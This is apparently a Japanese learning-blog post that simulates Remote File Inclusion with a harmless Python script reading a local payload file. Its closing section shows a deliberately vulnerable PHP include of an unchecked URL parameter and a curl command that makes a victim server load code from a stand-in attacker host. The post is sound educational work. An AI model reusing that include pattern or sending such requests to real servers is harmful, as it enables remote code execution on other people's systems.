# Day38_RFI脆弱性を用いたC2アクセスシミュレーション

### 今回の目的

今回はRFI（リモートファイルインクルージョン）のシミュレートをします。RFIがどのようにしてサーバーのコマンド実行（C2アクセス）に繋がるのか、そのメカニズムをPythonで再現し、理解を深めることが目的です。

:::note info
このチャレンジについて
目的: セキュリティエンジニアとしての技術力向上
手段: シェルスクリプト作成を通じて学習
実施する事: 自動化,監視,ツール開発基礎学習など
:::

### 目次

*   [実行結果](#実行結果)
*   [実行環境](#実行環境)
*   [開発ステップ](#開発ステップ)
*   [開発中の気づき](#開発中の気づき)
*   [コード全文](#コード全文)
*   [コードの詳細な解説](#コードの詳細な解説)
*   [実行方法](#実行方法)
*   [まとめ](#まとめ)

### 実行結果

被害者側のサーバにあるアプリケーション (`rfi_simulator.py`)の脆弱性を利用して、攻撃者がRFIでサーバーを乗っ取る シミュレーションを行っています。

```shell
# このコマンドを打つと...
python ./rfi_simulator.py http://localhost:8000/payload.txt "whoami"

# 以下の結果が出力される。
SIMULATING C2 COMMAND EXECUTION: [whoami]
```

**攻撃者サーバーのログ:**
攻撃者サーバー側では、`payload.txt`へのアクセスログが記録されます。
```
127.0.0.1 - - [04/Oct/2025 23:22:26] "GET /payload.txt HTTP/1.1" 200 -
```


### 実行環境

*   **クラウド環境:** N/A
*   **コンテナ技術:** N/A
*   **接続元（ローカルPC）:** Windows
*   **ターミナルソフト:** N/A
*   **接続先（サーバー）:** N/A (Local Simulation)
*   **使用言語:** Python
*   **外部ライブラリ:** requests
*   **テスト対象:** http://localhost:8000 (Python http.server)

### 開発ステップ

1.  攻撃用のペイロードファイル (`payload.txt`) を作成。
2.  Pythonの`http.server`モジュールを使い、ペイロードをホストするローカルWebサーバーを起動。
3.  脆弱なアプリケーションを模した`rfi_simulator.py`を作成。
4.  `sys.argv`でURLとコマンドをコマンドライン引数として受け取る処理を実装。
5.  `requests`ライブラリでURLからコンテンツを取得する処理を実装。
6.  取得したテキストに改行文字が含まれる問題を`repr()`で発見し、`strip()`で解決。
7.  ペイロードが正しいか検証し、C2コマンド実行をシミュレートする`print`文を実装。
8.  完成したシステムをテストし、意図した通りに動作することを確認。


### 開発中の気づき

`requests`で取得したテキストの末尾に潜んでいた改行文字`\n`の存在です。`if`文での単純な文字列比較が失敗する原因となっており、`repr()`関数でその存在を可視化することで問題を特定できました。外部から取得するデータは、たとえ単純なテキストでも`strip()`などでサニタイズ（無害化・整形）する習慣の重要性を再認識しました。

### コード全文

```python
import sys
import requests

url = sys.argv[1]
command = sys.argv[2]

response = requests.get(url)
result = response.text

if result.strip() == "RFI_PAYLOAD_SUCCESS":
    print(f"SIMULATING C2 COMMAND EXECUTION: [{command}]")
else:
    pass
```

### コードの詳細な解説

*   `result = requests.get(url).text`: 指定されたURLからテキスト内容を取得します。RFI脆弱性の核心部分です。
*   `if result.strip() == "RFI_PAYLOAD_SUCCESS":`: `strip()`で取得したテキストの前後の空白や改行を削除してから、期待するペイロード文字列と比較します。これにより、予期せぬ改行文字による比較の失敗を防ぎます。
### 実行方法

1.  **ターミナル1（サーバー役）:**
    `payload.txt` があるディレクトリに移動し、以下のコマンドでWebサーバーを起動します。
    ```shell
    python -m http.server
    ```

2.  **ターミナル2（攻撃者役）:**
    `rfi_simulator.py` があるディレクトリで、以下のコマンドを実行します。
    ```shell
    python ./rfi_simulator.py http://localhost:8000/payload.txt "任意のコマンド"
    ```

#### 補足：このシミュレーションの役割について

上記の `python ./rfi_simulator.py ...` というコマンドは、誰がどこで実行しているのか混乱しそうなので補足します。

このコマンドは、**「もし攻撃者が被害者のWebアプリケーションに不正なURLを送り込んだら、被害者サーバーの内部では、このような処理が引き起こされるだろう」**という一連の動作を、**被害者サーバーの視点で手元でシミュレートしたもの**です。

`rfi_simulator.py`は被害者サーバー上で動いている脆弱なプログラムのことであり、このコマンドは**攻撃リクエストを受け取った被害者サーバーが、内部でそのプログラムを実行する様子**を模している、と解釈してください。

#### 現実の攻撃シナリオとの対比

今回のシミュレーションが、現実のWeb攻撃でどのように行われるかから逆算するとおそらく伝わると思います。

**1. 脆弱なプログラムの存在**

被害者のサーバー（`victim.com`）では、Webサーバー（Apacheなど）上で、以下のような脆弱なPHPプログラム（`app.php`）が動いていると仮定します。

```php
<?php
  // URLから渡されたパラメータを検証せずにそのままinclude
  include($_GET['page']); 
?>
```

**2. 攻撃者によるHTTPリクエスト**

攻撃者は、自分のPCからブラウザや`curl`コマンドを使い、この`app.php`に対して、自身のサーバーで公開している不正なファイルを読み込ませるようリクエストを送信します。

```shell
# 攻撃者が自分のPCで打つコマンド
curl "http://victim.com/app.php?page=http://attacker.com/payload.txt"
```

**3. 攻撃の成立**

リクエストを受け取った被害者サーバーは、`app.php`を実行し、PHPの`include`関数が攻撃者のサーバーにある`payload.txt`を読み込み、その内容を実行します。これによって攻撃者がサーバーの制御を奪える可能性が生まれます。


### まとめ

今回はRFI脆弱性を利用してC2アクセスを確立するシミュレーションを行いました。単純なファイル読み込み機能が、結構深刻なコマンド実行に繋がりうるのは怖いですね～。入力値の検証、特に外部から与えられるURLやパスを安易に信用しないことが重要ぽい
